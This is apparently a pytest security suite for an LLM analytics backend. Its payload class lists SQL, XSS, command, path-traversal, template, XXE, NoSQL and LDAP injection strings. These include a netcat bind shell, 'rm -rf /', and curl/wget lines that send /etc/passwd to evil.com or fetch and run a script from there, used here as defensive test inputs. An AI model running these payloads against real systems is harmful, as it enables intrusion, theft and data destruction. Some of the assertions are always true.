# Security Testing Suite
# Comprehensive security tests for input validation, injection prevention, and data protection

import pytest
import asyncio
import threading
import time
import random
import hashlib
import base64
import jwt
import os
import sys
import tempfile
import json
import re
from typing import Dict, List, Any, Optional, Tuple, Union
from unittest.mock import patch, Mock, MagicMock
import subprocess
import socket
import ssl
from io import StringIO, BytesIO

# Import components for security testing
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', 'src'))
from backend.core.optimized_data_structures import OptimizedTrie, HighPerformanceHashMap, OptimizedDataProcessor
from backend.core.optimized_llm_client import OptimizedLLMClient, SmartCache, OptimizedConnectionPool
from backend.core.rate_limiter import RateLimiter
from backend.core.optimized_file_io import OptimizedFileProcessor, StreamingCSVReader
from backend.core.enhanced_cache_integration import EnhancedCacheManager
from backend.core.intelligent_query_engine import IntelligentQueryRouter, QueryPatternAnalyzer


class SecurityTestPayloads:
    """Collection of security test payloads and attack vectors"""
    
    @staticmethod
    def get_sql_injection_payloads() -> List[str]:
        """SQL injection attack payloads"""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' OR 1=1 --",
            "') OR ('1'='1",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT username, password FROM users --",
            "1; SELECT * FROM users",
            "1' AND (SELECT SUBSTR(username,1,1) FROM users WHERE username='admin')='a'--",
            "' OR (SELECT COUNT(*) FROM users) > 0 --",
            "'; INSERT INTO users VALUES ('hacker','password'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "1' ORDER BY 1 --",
            "1' GROUP BY 1 --",
            "' HAVING 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; WAITFOR DELAY '00:00:05'; --",
        ]
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Cross-site scripting attack payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Command injection attack payloads"""
        return [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "|| id",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l -p 4444 -e /bin/sh",
            "&& python -c 'import os; os.system(\"whoami\")'",
            "; powershell.exe -Command \"Get-Process\"",
            "| cmd /c dir",
            "&& net user",
            "; curl http://evil.com/steal?data=`cat /etc/passwd`",
            "| wget http://evil.com/malware.sh -O - | sh",
            "&& (curl -s http://evil.com/exfil || wget -q -O- http://evil.com/exfil)",
        ]
    
    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        """Path traversal attack payloads"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "/etc/passwd%00",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "\\..\\..\\..\\etc\\passwd",
            "file:///etc/passwd",
            "..;/etc/passwd",
            "..//etc/passwd",
            "..../etc/passwd",
            ".../etc/passwd",
        ]
    
    @staticmethod
    def get_template_injection_payloads() -> List[str]:
        """Template injection attack payloads"""
        return [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "${java.lang.Runtime.getRuntime().exec('whoami')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.System).getProperty('user.name')}",
            "{{lipsum.__globals__.os.popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
            "${{<%[%'\"}}",
            "{{7*'7'}}",
            "${7*7}${user.name}",
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}",
        ]
    
    @staticmethod
    def get_xxe_payloads() -> List[str]:
        """XML External Entity attack payloads"""
        return [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>""",
            """<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd"><foo/>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>""",
        ]
    
    @staticmethod
    def get_nosql_injection_payloads() -> List[str]:
        """NoSQL injection attack payloads"""
        return [
            "'; return true; var x='",
            "'; return db.users.find(); var x='",
            "' || 1==1 || '",
            "' && this.username == 'admin' && '",
            "{\"$where\": \"return true\"}",
            "{\"$regex\": \".*\"}",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$exists\": true}",
            "' || this.username != null || '",
            "'; return JSON.stringify(this); var x='",
            "{\"username\": {\"$regex\": \".*\"}}",
            "' || JSON.stringify(this).indexOf('password') != -1 || '",
        ]
    
    @staticmethod
    def get_ldap_injection_payloads() -> List[str]:
        """LDAP injection attack payloads"""
        return [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(cn=*))(|(cn=*",
            "admin*",
            "admin)(|(cn=*",
            "*)(objectClass=*",
            ")(cn=*)(|(cn=*",
            "*)(|(objectClass=*",
            "admin)(&(objectClass=*",
            "*))%00",
        ]


class TestInputValidationSecurity:
    """Security tests for input validation across all components"""
    
    def test_sql_injection_resistance(self):
        """Test resistance to SQL injection attacks"""
        components = [
            OptimizedTrie(),
            HighPerformanceHashMap(),
            SmartCache(max_size=100, ttl=3600),
        ]
        
        sql_payloads = SecurityTestPayloads.get_sql_injection_payloads()
        
        for payload in sql_payloads:
            for i, component in enumerate(components):
                try:
                    key = f"sql_test_{i}"
                    
                    if hasattr(component, 'insert'):
                        component.insert(key, payload)
                        result = component.search(key)
                        # Should store payload as data, not execute it
                        assert result == payload, f"Component {i} modified SQL payload"
                        
                        # Also test payload as key
                        safe_payload = payload.replace('\x00', '').strip()  # Remove null bytes
                        if len(safe_payload) > 0:
                            component.insert(safe_payload[:100], "test_value")  # Limit key length
                            result = component.search(safe_payload[:100])
                            assert result == "test_value", f"Component {i} failed with SQL payload as key"
                            
                    elif hasattr(component, 'put'):
                        component.put(key, payload)
                        result = component.get(key)
                        if result is not None:  # Cache might evict
                            assert result == payload, f"Component {i} modified SQL payload"
                        
                        # Test payload as key
                        safe_payload = payload.replace('\x00', '').strip()
                        if len(safe_payload) > 0:
                            component.put(safe_payload[:100], "test_value")
                            result = component.get(safe_payload[:100])
                            if result is not None:
                                assert result == "test_value", f"Component {i} failed with SQL payload as key"
                
                except (ValueError, TypeError, UnicodeError) as e:
                    # Expected for some malformed payloads
                    print(f"Component {i} rejected SQL payload (expected): {e}")
    
    def test_xss_payload_sanitization(self):
        """Test XSS payload handling and sanitization"""
        processor = OptimizedFileProcessor()
        query_analyzer = QueryPatternAnalyzer()
        
        xss_payloads = SecurityTestPayloads.get_xss_payloads()
        
        for payload in xss_payloads:
            # Test file processor with XSS in JSON
            test_data = {
                "user_input": payload,
                "description": f"Test data with XSS payload: {payload[:20]}..."
            }
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump(test_data, f)
                temp_path = f.name
            
            try:
                result = asyncio.run(processor.process_file(temp_path))
                
                if 'error' not in result:
                    # Should not execute script tags
                    result_str = str(result).lower()
                    assert '<script>' not in result_str or 'script' in result_str  # Allow mention of word "script"
                    assert 'alert(' not in result_str
                    assert 'javascript:' not in result_str
                    
                    # Original payload should be preserved as data
                    assert payload in str(result['data'])
                    
            finally:
                os.unlink(temp_path)
            
            # Test query analyzer with XSS payload
            try:
                analysis_result = query_analyzer.analyze_query(payload)
                
                # Should analyze without executing
                assert isinstance(analysis_result, dict)
                assert 'query_type' in analysis_result
                
                # Should not contain executed script results
                analysis_str = str(analysis_result).lower()
                assert 'alert(' not in analysis_str
                assert '<script>' not in analysis_str or 'script' in analysis_str
                
            except Exception as e:
                print(f"Query analyzer handled XSS payload with error (acceptable): {e}")
    
    def test_command_injection_resistance(self):
        """Test resistance to command injection attacks"""
        processor = OptimizedFileProcessor()
        
        command_payloads = SecurityTestPayloads.get_command_injection_payloads()
        
        for payload in command_payloads:
            # Test with payload in filename-like context
            safe_filename = re.sub(r'[^\w\-_\.]', '_', payload)[:50] + '.txt'
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(f"Test content with command injection attempt: {payload}")
                temp_path = f.name
            
            try:
                result = asyncio.run(processor.process_file(temp_path))
                
                # Should process file without executing commands
                if 'error' not in result:
                    result_str = str(result)
                    
                    # Should not contain command execution results
                    assert '/etc/passwd' not in result_str
                    assert 'root:' not in result_str
                    assert 'uid=' not in result_str
                    assert 'gid=' not in result_str
                    
                    # Original payload should be preserved in data
                    assert payload in result_str
                    
            except Exception as e:
                print(f"Command injection payload handled with error (acceptable): {e}")
            finally:
                os.unlink(temp_path)
    
    def test_path_traversal_resistance(self):
        """Test resistance to path traversal attacks"""
        processor = OptimizedFileProcessor()
        
        path_payloads = SecurityTestPayloads.get_path_traversal_payloads()
        
        for payload in path_payloads:
            try:
                # Should not be able to access system files through traversal
                result = asyncio.run(processor.process_file(payload))
                
                if 'error' not in result:
                    # If it doesn't error, should not contain sensitive system data
                    result_str = str(result).lower()
                    assert 'root:x:0:0:' not in result_str  # Unix passwd format
                    assert 'administrator' not in result_str
                    assert 'system32' not in result_str
                    assert '[administrators]' not in result_str
                    
            except (FileNotFoundError, PermissionError, OSError):
                # Expected for path traversal attempts
                pass
            except Exception as e:
                print(f"Path traversal attempt handled: {e}")
    
    def test_template_injection_resistance(self):
        """Test resistance to template injection attacks"""
        query_analyzer = QueryPatternAnalyzer()
        
        template_payloads = SecurityTestPayloads.get_template_injection_payloads()
        
        for payload in template_payloads:
            try:
                result = query_analyzer.analyze_query(payload)
                
                # Should analyze without executing template code
                assert isinstance(result, dict)
                
                result_str = str(result)
                # Should not contain template execution results
                assert '49' not in result_str  # 7*7 = 49
                assert '/etc/passwd' not in result_str
                assert 'root:' not in result_str
                assert 'config' not in result_str.lower() or 'configuration' in result_str.lower()
                
            except Exception as e:
                print(f"Template injection payload handled with error (acceptable): {e}")
    
    def test_xxe_injection_resistance(self):
        """Test resistance to XXE injection attacks"""
        processor = OptimizedFileProcessor()
        
        xxe_payloads = SecurityTestPayloads.get_xxe_payloads()
        
        for payload in xxe_payloads:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(payload)
                temp_path = f.name
            
            try:
                result = asyncio.run(processor.process_file(temp_path))
                
                # Should handle XML without resolving external entities
                if 'error' not in result:
                    result_str = str(result).lower()
                    assert 'root:x:0:0:' not in result_str  # Unix passwd content
                    assert '/etc/passwd' not in result_str
                    assert 'administrator' not in result_str
                
            except Exception as e:
                print(f"XXE payload handled with error (expected): {e}")
            finally:
                os.unlink(temp_path)


class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms"""
    
    def test_weak_password_detection(self):
        """Test detection of weak passwords"""
        weak_passwords = [
            "password",
            "123456",
            "admin",
            "root",
            "qwerty",
            "abc123",
            "password123",
            "admin123",
            "123456789",
            "iloveyou",
            "password1",
            "123123123",
            "000000",
            "1234567890",
        ]
        
        # Simulate password validation
        def validate_password_strength(password: str) -> Dict[str, Any]:
            """Simulate password strength validation"""
            score = 0
            feedback = []
            
            if len(password) >= 8:
                score += 1
            else:
                feedback.append("Password too short")
            
            if re.search(r'[A-Z]', password):
                score += 1
            else:
                feedback.append("Missing uppercase letter")
            
            if re.search(r'[a-z]', password):
                score += 1
            else:
                feedback.append("Missing lowercase letter")
            
            if re.search(r'[0-9]', password):
                score += 1
            else:
                feedback.append("Missing number")
            
            if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
                score += 1
            else:
                feedback.append("Missing special character")
            
            # Check against common passwords
            if password.lower() in [p.lower() for p in weak_passwords]:
                score = max(0, score - 2)
                feedback.append("Common password detected")
            
            return {
                'score': score,
                'max_score': 5,
                'is_strong': score >= 4,
                'feedback': feedback
            }
        
        # Test weak passwords
        for weak_password in weak_passwords:
            result = validate_password_strength(weak_password)
            assert not result['is_strong'], f"Weak password '{weak_password}' was not detected as weak"
            assert result['score'] < 4, f"Weak password '{weak_password}' scored too high: {result['score']}"
        
        # Test strong passwords
        strong_passwords = [
            "MyStr0ng!Password",
            "C0mpl3x&Secure#Pass",
            "Rand0m$SecureP@ss2024",
            "Un1qu3!V3ryStr0ngP@ssw0rd",
        ]
        
        for strong_password in strong_passwords:
            result = validate_password_strength(strong_password)
            assert result['is_strong'], f"Strong password '{strong_password}' was not detected as strong: {result}"
    
    def test_jwt_token_security(self):
        """Test JWT token security implementation"""
        secret_key = "test_secret_key_that_should_be_much_longer_in_production"
        
        # Test JWT creation and validation
        def create_jwt_token(user_id: str, role: str, expiration_minutes: int = 60) -> str:
            """Create JWT token"""
            payload = {
                'user_id': user_id,
                'role': role,
                'exp': time.time() + (expiration_minutes * 60),
                'iat': time.time(),
                'iss': 'nexus-llm-analytics'
            }
            return jwt.encode(payload, secret_key, algorithm='HS256')
        
        def validate_jwt_token(token: str) -> Dict[str, Any]:
            """Validate JWT token"""
            try:
                payload = jwt.decode(token, secret_key, algorithms=['HS256'])
                return {'valid': True, 'payload': payload}
            except jwt.ExpiredSignatureError:
                return {'valid': False, 'error': 'Token expired'}
            except jwt.InvalidTokenError:
                return {'valid': False, 'error': 'Invalid token'}
        
        # Test valid token
        valid_token = create_jwt_token("user123", "user")
        validation_result = validate_jwt_token(valid_token)
        assert validation_result['valid'], "Valid JWT token was rejected"
        assert validation_result['payload']['user_id'] == "user123"
        
        # Test expired token
        expired_token = create_jwt_token("user123", "user", expiration_minutes=-1)
        time.sleep(0.1)  # Ensure expiration
        validation_result = validate_jwt_token(expired_token)
        assert not validation_result['valid'], "Expired JWT token was accepted"
        assert 'expired' in validation_result['error'].lower()
        
        # Test tampered token
        tampered_token = valid_token[:-5] + "XXXXX"  # Tamper with signature
        validation_result = validate_jwt_token(tampered_token)
        assert not validation_result['valid'], "Tampered JWT token was accepted"
        
        # Test token with wrong secret
        wrong_secret_token = jwt.encode({'user_id': 'hacker'}, 'wrong_secret', algorithm='HS256')
        validation_result = validate_jwt_token(wrong_secret_token)
        assert not validation_result['valid'], "Token with wrong secret was accepted"
    
    def test_session_security(self):
        """Test session management security"""
        
        class SecureSessionManager:
            """Simulate secure session management"""
            
            def __init__(self):
                self.sessions = {}
                self.session_timeout = 1800  # 30 minutes
            
            def create_session(self, user_id: str) -> str:
                """Create secure session"""
                session_id = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
                self.sessions[session_id] = {
                    'user_id': user_id,
                    'created_at': time.time(),
                    'last_activity': time.time(),
                    'csrf_token': base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
                }
                return session_id
            
            def validate_session(self, session_id: str) -> Dict[str, Any]:
                """Validate session"""
                if session_id not in self.sessions:
                    return {'valid': False, 'error': 'Session not found'}
                
                session = self.sessions[session_id]
                current_time = time.time()
                
                # Check timeout
                if current_time - session['last_activity'] > self.session_timeout:
                    del self.sessions[session_id]
                    return {'valid': False, 'error': 'Session expired'}
                
                # Update last activity
                session['last_activity'] = current_time
                return {'valid': True, 'session': session}
            
            def invalidate_session(self, session_id: str):
                """Invalidate session"""
                if session_id in self.sessions:
                    del self.sessions[session_id]
        
        session_manager = SecureSessionManager()
        
        # Test session creation
        session_id = session_manager.create_session("user123")
        assert len(session_id) > 20, "Session ID too short"
        
        # Test session validation
        validation_result = session_manager.validate_session(session_id)
        assert validation_result['valid'], "Valid session was rejected"
        assert validation_result['session']['user_id'] == "user123"
        
        # Test invalid session
        invalid_session = "invalid_session_id"
        validation_result = session_manager.validate_session(invalid_session)
        assert not validation_result['valid'], "Invalid session was accepted"
        
        # Test session timeout
        session_manager.session_timeout = 0.1  # 100ms timeout
        time.sleep(0.2)  # Wait for timeout
        validation_result = session_manager.validate_session(session_id)
        assert not validation_result['valid'], "Expired session was accepted"
        
        # Test session invalidation
        new_session_id = session_manager.create_session("user456")
        session_manager.invalidate_session(new_session_id)
        validation_result = session_manager.validate_session(new_session_id)
        assert not validation_result['valid'], "Invalidated session was accepted"


class TestDataProtectionSecurity:
    """Security tests for data protection and encryption"""
    
    def test_sensitive_data_sanitization(self):
        """Test sanitization of sensitive data"""
        
        def sanitize_sensitive_data(data: Dict[str, Any]) -> Dict[str, Any]:
            """Sanitize sensitive data fields"""
            sensitive_fields = [
                'password', 'passwd', 'pwd', 'secret', 'token', 'key', 'private',
                'ssn', 'social_security', 'credit_card', 'cc_number', 'cvv',
                'api_key', 'access_token', 'refresh_token', 'session_id'
            ]
            
            def sanitize_value(key: str, value: Any) -> Any:
                """Sanitize individual value"""
                if isinstance(key, str) and any(field in key.lower() for field in sensitive_fields):
                    if isinstance(value, str) and len(value) > 0:
                        return "*" * min(len(value), 8)  # Mask with asterisks
                    else:
                        return "[REDACTED]"
                elif isinstance(value, dict):
                    return {k: sanitize_value(k, v) for k, v in value.items()}
                elif isinstance(value, list):
                    return [sanitize_value(f"item_{i}", item) for i, item in enumerate(value)]
                else:
                    return value
            
            return {k: sanitize_value(k, v) for k, v in data.items()}
        
        # Test data with sensitive information
        sensitive_data = {
            'username': 'john_doe',
            'password': 'secret123',
            'email': 'john@example.com',
            'api_key': 'sk-1234567890abcdef',
            'credit_card': '4111111111111111',
            'user_data': {
                'name': 'John Doe',
                'ssn': '123-45-6789',
                'private_key': 'RSA_PRIVATE_KEY_HERE'
            },
            'tokens': ['access_token_123', 'refresh_token_456']
        }
        
        sanitized = sanitize_sensitive_data(sensitive_data)
        
        # Verify sensitive fields are sanitized
        assert sanitized['username'] == 'john_doe', "Non-sensitive field was sanitized"
        assert sanitized['email'] == 'john@example.com', "Non-sensitive field was sanitized"
        assert sanitized['password'] == '********', "Password was not sanitized"
        assert sanitized['api_key'] == '********', "API key was not sanitized"
        assert sanitized['credit_card'] == '********', "Credit card was not sanitized"
        assert sanitized['user_data']['name'] == 'John Doe', "Non-sensitive nested field was sanitized"
        assert sanitized['user_data']['ssn'] == '********', "SSN was not sanitized"
        assert sanitized['user_data']['private_key'] == '[REDACTED]', "Private key was not sanitized"
    
    def test_data_encryption_integrity(self):
        """Test data encryption and integrity verification"""
        
        def encrypt_data(data: str, key: bytes) -> Dict[str, str]:
            """Simulate data encryption"""
            import hmac
            
            # Simple XOR encryption (for testing only - not cryptographically secure)
            encrypted = bytearray()
            for i, byte in enumerate(data.encode('utf-8')):
                encrypted.append(byte ^ key[i % len(key)])
            
            encrypted_b64 = base64.b64encode(bytes(encrypted)).decode('utf-8')
            
            # Generate HMAC for integrity
            mac = hmac.new(key, encrypted, hashlib.sha256).hexdigest()
            
            return {
                'data': encrypted_b64,
                'mac': mac
            }
        
        def decrypt_data(encrypted_data: Dict[str, str], key: bytes) -> Dict[str, Any]:
            """Simulate data decryption with integrity check"""
            import hmac
            
            try:
                encrypted_bytes = base64.b64decode(encrypted_data['data'])
                
                # Verify integrity
                expected_mac = hmac.new(key, encrypted_bytes, hashlib.sha256).hexdigest()
                if not hmac.compare_digest(expected_mac, encrypted_data['mac']):
                    return {'success': False, 'error': 'Integrity check failed'}
                
                # Decrypt
                decrypted = bytearray()
                for i, byte in enumerate(encrypted_bytes):
                    decrypted.append(byte ^ key[i % len(key)])
                
                return {'success': True, 'data': decrypted.decode('utf-8')}
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        # Test encryption/decryption
        key = os.urandom(32)  # 256-bit key
        original_data = "Sensitive user data that needs protection"
        
        # Encrypt
        encrypted = encrypt_data(original_data, key)
        assert 'data' in encrypted
        assert 'mac' in encrypted
        assert encrypted['data'] != original_data, "Data was not encrypted"
        
        # Decrypt with correct key
        decrypted = decrypt_data(encrypted, key)
        assert decrypted['success'], f"Decryption failed: {decrypted.get('error')}"
        assert decrypted['data'] == original_data, "Decrypted data doesn't match original"
        
        # Test with wrong key
        wrong_key = os.urandom(32)
        decrypted_wrong = decrypt_data(encrypted, wrong_key)
        assert not decrypted_wrong['success'], "Decryption with wrong key should fail"
        
        # Test with tampered data
        tampered_encrypted = encrypted.copy()
        tampered_encrypted['data'] = tampered_encrypted['data'][:-5] + "XXXXX"
        decrypted_tampered = decrypt_data(tampered_encrypted, key)
        assert not decrypted_tampered['success'], "Decryption of tampered data should fail"
        assert 'integrity' in decrypted_tampered['error'].lower()
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        
        def generate_secure_token(length: int = 32) -> str:
            """Generate cryptographically secure random token"""
            return base64.urlsafe_b64encode(os.urandom(length)).decode('utf-8')
        
        def test_randomness_quality(tokens: List[str]) -> Dict[str, Any]:
            """Test quality of random tokens"""
            if len(tokens) < 2:
                return {'sufficient_randomness': False, 'error': 'Not enough tokens'}
            
            # Check for duplicates
            unique_tokens = set(tokens)
            duplicate_rate = 1 - (len(unique_tokens) / len(tokens))
            
            # Check character distribution
            all_chars = ''.join(tokens)
            char_counts = {}
            for char in all_chars:
                char_counts[char] = char_counts.get(char, 0) + 1
            
            # Calculate chi-square test for uniform distribution
            expected_freq = len(all_chars) / len(char_counts)
            chi_square = sum((count - expected_freq) ** 2 / expected_freq for count in char_counts.values())
            
            return {
                'sufficient_randomness': duplicate_rate < 0.01 and chi_square < len(char_counts) * 2,
                'duplicate_rate': duplicate_rate,
                'chi_square': chi_square,
                'unique_chars': len(char_counts)
            }
        
        # Generate multiple tokens
        tokens = [generate_secure_token() for _ in range(1000)]
        
        # Test randomness
        randomness_result = test_randomness_quality(tokens)
        assert randomness_result['sufficient_randomness'], f"Insufficient randomness: {randomness_result}"
        assert randomness_result['duplicate_rate'] < 0.01, f"Too many duplicates: {randomness_result['duplicate_rate']:.2%}"
        
        # Test different lengths
        for length in [16, 32, 64]:
            token = generate_secure_token(length)
            # Base64 encoding increases length, so check it's reasonable
            assert len(token) > length, f"Token too short for length {length}"
            assert len(token) < length * 2, f"Token too long for length {length}"


class TestAccessControlSecurity:
    """Security tests for access control and authorization"""
    
    def test_role_based_access_control(self):
        """Test role-based access control implementation"""
        
        class RoleBasedAccessControl:
            """Simulate RBAC system"""
            
            def __init__(self):
                self.roles = {
                    'admin': ['read', 'write', 'delete', 'manage_users', 'view_logs'],
                    'user': ['read', 'write'],
                    'readonly': ['read'],
                    'guest': []
                }
                self.user_roles = {}
            
            def assign_role(self, user_id: str, role: str):
                """Assign role to user"""
                if role in self.roles:
                    self.user_roles[user_id] = role
            
            def check_permission(self, user_id: str, permission: str) -> bool:
                """Check if user has permission"""
                role = self.user_roles.get(user_id)
                if not role:
                    return False
                return permission in self.roles.get(role, [])
            
            def get_user_permissions(self, user_id: str) -> List[str]:
                """Get all permissions for user"""
                role = self.user_roles.get(user_id)
                return self.roles.get(role, [])
        
        rbac = RoleBasedAccessControl()
        
        # Test role assignment and permissions
        rbac.assign_role('admin_user', 'admin')
        rbac.assign_role('regular_user', 'user')
        rbac.assign_role('readonly_user', 'readonly')
        
        # Test admin permissions
        assert rbac.check_permission('admin_user', 'read'), "Admin should have read permission"
        assert rbac.check_permission('admin_user', 'write'), "Admin should have write permission"
        assert rbac.check_permission('admin_user', 'delete'), "Admin should have delete permission"
        assert rbac.check_permission('admin_user', 'manage_users'), "Admin should have manage_users permission"
        
        # Test regular user permissions
        assert rbac.check_permission('regular_user', 'read'), "User should have read permission"
        assert rbac.check_permission('regular_user', 'write'), "User should have write permission"
        assert not rbac.check_permission('regular_user', 'delete'), "User should not have delete permission"
        assert not rbac.check_permission('regular_user', 'manage_users'), "User should not have manage_users permission"
        
        # Test readonly user permissions
        assert rbac.check_permission('readonly_user', 'read'), "Readonly user should have read permission"
        assert not rbac.check_permission('readonly_user', 'write'), "Readonly user should not have write permission"
        assert not rbac.check_permission('readonly_user', 'delete'), "Readonly user should not have delete permission"
        
        # Test non-existent user
        assert not rbac.check_permission('nonexistent_user', 'read'), "Non-existent user should not have permissions"
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks"""
        
        class SecureUserManager:
            """Simulate secure user management"""
            
            def __init__(self):
                self.users = {
                    'admin': {'role': 'admin', 'can_promote': True},
                    'user1': {'role': 'user', 'can_promote': False},
                    'user2': {'role': 'readonly', 'can_promote': False}
                }
            
            def promote_user(self, promoter_id: str, target_user_id: str, new_role: str) -> Dict[str, Any]:
                """Attempt to promote user"""
                # Check if promoter exists and has promotion rights
                promoter = self.users.get(promoter_id)
                if not promoter:
                    return {'success': False, 'error': 'Promoter not found'}
                
                if not promoter.get('can_promote', False):
                    return {'success': False, 'error': 'Insufficient privileges to promote users'}
                
                # Check if target user exists
                if target_user_id not in self.users:
                    return {'success': False, 'error': 'Target user not found'}
                
                # Prevent self-promotion to admin (additional security)
                if promoter_id == target_user_id and new_role == 'admin':
                    return {'success': False, 'error': 'Cannot promote self to admin role'}
                
                # Valid promotion
                self.users[target_user_id]['role'] = new_role
                return {'success': True, 'message': f'User {target_user_id} promoted to {new_role}'}
            
            def get_user_role(self, user_id: str) -> Optional[str]:
                """Get user role"""
                return self.users.get(user_id, {}).get('role')
        
        user_manager = SecureUserManager()
        
        # Test legitimate promotion by admin
        result = user_manager.promote_user('admin', 'user1', 'admin')
        assert result['success'], f"Legitimate promotion failed: {result}"
        assert user_manager.get_user_role('user1') == 'admin'
        
        # Test illegitimate promotion by regular user
        result = user_manager.promote_user('user2', 'user2', 'admin')
        assert not result['success'], "Illegitimate self-promotion succeeded"
        assert 'insufficient privileges' in result['error'].lower()
        assert user_manager.get_user_role('user2') == 'readonly'
        
        # Test promotion by non-existent user
        result = user_manager.promote_user('nonexistent', 'user2', 'admin')
        assert not result['success'], "Promotion by non-existent user succeeded"
        
        # Test promotion of non-existent user
        result = user_manager.promote_user('admin', 'nonexistent', 'admin')
        assert not result['success'], "Promotion of non-existent user succeeded"
    
    def test_resource_access_control(self):
        """Test resource-level access control"""
        
        class ResourceAccessControl:
            """Simulate resource access control"""
            
            def __init__(self):
                self.resources = {
                    'document1': {'owner': 'user1', 'permissions': {'user1': 'write', 'user2': 'read'}},
                    'document2': {'owner': 'user2', 'permissions': {'user2': 'write'}},
                    'public_doc': {'owner': 'admin', 'permissions': {'*': 'read'}}
                }
            
            def check_resource_access(self, user_id: str, resource_id: str, action: str) -> bool:
                """Check if user can perform action on resource"""
                resource = self.resources.get(resource_id)
                if not resource:
                    return False
                
                permissions = resource['permissions']
                
                # Check explicit permission
                user_permission = permissions.get(user_id)
                if user_permission:
                    if action == 'read' and user_permission in ['read', 'write']:
                        return True
                    if action == 'write' and user_permission == 'write':
                        return True
                
                # Check wildcard permission
                wildcard_permission = permissions.get('*')
                if wildcard_permission:
                    if action == 'read' and wildcard_permission in ['read', 'write']:
                        return True
                    if action == 'write' and wildcard_permission == 'write':
                        return True
                
                return False
            
            def create_resource(self, owner_id: str, resource_id: str) -> bool:
                """Create new resource"""
                if resource_id in self.resources:
                    return False
                
                self.resources[resource_id] = {
                    'owner': owner_id,
                    'permissions': {owner_id: 'write'}
                }
                return True
        
        rac = ResourceAccessControl()
        
        # Test owner access
        assert rac.check_resource_access('user1', 'document1', 'read'), "Owner should have read access"
        assert rac.check_resource_access('user1', 'document1', 'write'), "Owner should have write access"
        
        # Test granted access
        assert rac.check_resource_access('user2', 'document1', 'read'), "User2 should have read access to document1"
        assert not rac.check_resource_access('user2', 'document1', 'write'), "User2 should not have write access to document1"
        
        # Test no access
        assert not rac.check_resource_access('user1', 'document2', 'read'), "User1 should not have access to document2"
        assert not rac.check_resource_access('user1', 'document2', 'write'), "User1 should not have write access to document2"
        
        # Test public access
        assert rac.check_resource_access('user1', 'public_doc', 'read'), "Anyone should have read access to public doc"
        assert not rac.check_resource_access('user1', 'public_doc', 'write'), "Non-owner should not have write access to public doc"
        
        # Test resource creation
        assert rac.create_resource('user3', 'new_document'), "Should be able to create new resource"
        assert rac.check_resource_access('user3', 'new_document', 'write'), "Creator should have write access to new resource"
        assert not rac.create_resource('user3', 'new_document'), "Should not be able to create duplicate resource"


if __name__ == '__main__':
    # Run security tests
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '-m', 'security or not slow',  # Run security tests but skip slow ones
    ])